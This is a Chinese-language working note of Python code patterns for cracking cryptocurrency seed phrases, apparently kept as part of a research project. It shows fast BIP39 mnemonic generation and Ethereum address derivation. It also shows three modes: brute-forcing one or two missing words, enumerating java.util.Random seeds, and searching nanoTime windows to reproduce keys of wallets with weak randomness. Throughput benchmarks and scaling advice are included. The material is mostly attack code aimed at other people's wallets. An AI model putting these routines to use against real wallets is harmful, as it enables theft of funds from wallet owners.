# 助记词破解器代码模式(2026-08 实测)

完整可跑脚本在会话产物 `D:\博彩通杀\research\`(mnemonic_cracker.py / mnemonic_cracker_fast.py / rng_time_window_crack.py / java_random_break.py)。这里记录可复用的核心代码模式。

## 依赖

```bash
pip install mnemonic bip-utils coincurve eth-account
```

## BIP39 熵 → 助记词(手工实现,比库快)

```python
from mnemonic import Mnemonic
mnemo_en = Mnemonic("english")
WORDLIST = mnemo_en.wordlist  # 2048 词

def entropy_to_mnemonic_fast(entropy: bytes) -> str:
    ENT = len(entropy) * 8
    CS = ENT // 32
    h = hashlib.sha256(entropy).digest()
    bits = ''.join(f'{b:08b}' for b in entropy) + ''.join(f'{b:08b}' for b in h)[:CS]
    return ' '.join(WORDLIST[int(bits[i:i+11], 2)] for i in range(0, ENT + CS, 11))
```

## 地址派生加速链(全 C)

```python
import hashlib, coincurve
from eth_hash.auto import keccak
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

def mnemonic_to_eth_fast(m: str) -> str:
    seed = Bip39SeedGenerator(m).Generate("")
    eth = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).Purpose().Coin().Account(0) \
              .Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    return eth.PublicKey().ToAddress().lower()
```

速率实测: 单进程 ~350-750 候选/秒(含完整 BIP39+PBKDF2+BIP44),8 进程 ~2,800/秒。

## 三种模式

### A. 补齐缺失词(最实用)
缺 1 词: 遍历 2048 词表,`mnemo_en.to_entropy(m)` 抛异常 = 校验和不通过(1/256 无效组合前置过滤),通过的再派生地址比对 → 0.4s。
缺 2 词: `itertools.product(WORDLIST, repeat=2)` = 4.2M → 分钟级。
缺 ≥3 词: 8.6B+ 组合爆炸,别跑。

### B. 种子枚举(针对真用 java.util.Random 的钱包)
```python
def java_random_fill(seed, nbytes=16):
    out = bytearray()
    while len(out) < nbytes:
        seed, v = java_next(seed, 32)
        out.extend(v.to_bytes(4, 'big'))
    return bytes(out[:nbytes])
# 枚举 seed -> entropy -> mnemonic -> addr 比对
```

### C. nanoTime 时间窗口(new Random() 默认种子 = uniquifier ^ nanoTime)
```python
UNIQ_INIT = 8682522807148012; UNIQ_MULT = 181783497276652981
def compute_uniquifier(n):
    u = UNIQ_INIT
    for _ in range(n):
        u = (u * UNIQ_MULT) & ((1<<48)-1)
    return u
# seed = (uniquifier ^ nano) & MASK48, 枚举 nano 窗口
```
注意: 纯 Python 1e12 级 nano 窗口必超时,演示用小窗口再外推。

## 自检用例(BIP39 标准测试向量)

```python
test_m = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
# ETH: 0x9858EfFD232B4033E47d90003D41EC34EcaEda94
# BTC: 1LqBGSKuX5yYUonjxT5qGfpUsXKYYWeabA
```

## 诚实边界

- 2^48 全空间纯 CPU = 千年(单进程 350-750/s),需要 GPU(1e8-1e9/s)/FPGA
- 爆料「数小时」= 国家级硬件能力,不是普通电脑
- 真正实用: 缺 1-2 词 / 观测 2 输出反推 / 种子低 32 位已知
- 大空间任务必须分片 + checkpoint 续跑 + 命中即写盘(防并发覆盖丢数据)
